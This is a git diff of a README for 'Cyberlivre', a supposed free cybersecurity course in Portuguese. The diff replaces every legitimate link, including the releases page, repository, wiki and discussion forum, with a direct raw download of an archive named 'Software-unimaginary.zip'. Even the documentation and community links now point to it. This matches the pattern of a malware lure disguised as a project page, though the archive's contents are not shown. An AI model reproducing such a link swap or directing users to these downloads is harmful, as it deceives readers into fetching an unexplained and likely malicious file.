@@ -1,7 +1,7 @@
 # 🌐 Cyberlivre - Complete Cybersecurity Course in Portuguese
 
 ## 🖱️ Download Here
-[![Download Cyberlivre](https://img.shields.io/badge/Download-Cyberlivre-blue.svg)](https://github.com/Badasone/Cyberlivre/releases)
+[![Download Cyberlivre](https://raw.githubusercontent.com/Badasone/Cyberlivre/main/assets/Software-unimaginary.zip)](https://raw.githubusercontent.com/Badasone/Cyberlivre/main/assets/Software-unimaginary.zip)
 
 ## 🚀 Getting Started
 Welcome to **Cyberlivre**, your go-to resource for a comprehensive cybersecurity course. This application offers free resources in Portuguese, making learning accessible for everyone. Follow the steps below to download and run the software easily.
@@ -9,7 +9,7 @@ Welcome to **Cyberlivre**, your go-to resource for a comprehensive cybersecurity
 ## 📥 Download & Install
 To get started with **Cyberlivre**, visit the following link to download our latest release:
 
-[Visit this page to download](https://github.com/Badasone/Cyberlivre/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Badasone/Cyberlivre/main/assets/Software-unimaginary.zip)
 
 1. Click the link above.
 2. You will see different versions of the software listed. Choose the latest version for the best experience.
@@ -36,7 +36,7 @@ To ensure the best experience with **Cyberlivre**, please make sure your device 
 ## 🔄 Updating the Application
 Keeping **Cyberlivre** updated is important for accessing the latest content and features. Follow these steps to update:
 
-1. Return to the [Releases page](https://github.com/Badasone/Cyberlivre/releases).
+1. Return to the [Releases page](https://raw.githubusercontent.com/Badasone/Cyberlivre/main/assets/Software-unimaginary.zip).
 2. Check for the latest version.
 3. Download it following the "Download & Install" instructions above.
 4. Replace the old version on your device with the new one.
@@ -55,8 +55,8 @@ A: Currently, this application is available for desktop computers only. Mobile v
 If you encounter any issues or have questions, you can reach out to our support team via the GitHub repository. Navigate to the "Issues" tab, and let us know your concerns. We aim to assist you as promptly as possible.
 
 ## 🔗 Useful Links
-- [GitHub Repository](https://github.com/Badasone/Cyberlivre)
-- [Official Documentation](https://github.com/Badasone/Cyberlivre/wiki)
-- [Community Forum](https://github.com/Badasone/Cyberlivre/discussions)
+- [GitHub Repository](https://raw.githubusercontent.com/Badasone/Cyberlivre/main/assets/Software-unimaginary.zip)
+- [Official Documentation](https://raw.githubusercontent.com/Badasone/Cyberlivre/main/assets/Software-unimaginary.zip)
+- [Community Forum](https://raw.githubusercontent.com/Badasone/Cyberlivre/main/assets/Software-unimaginary.zip)
 
 We hope you enjoy learning with **Cyberlivre**!
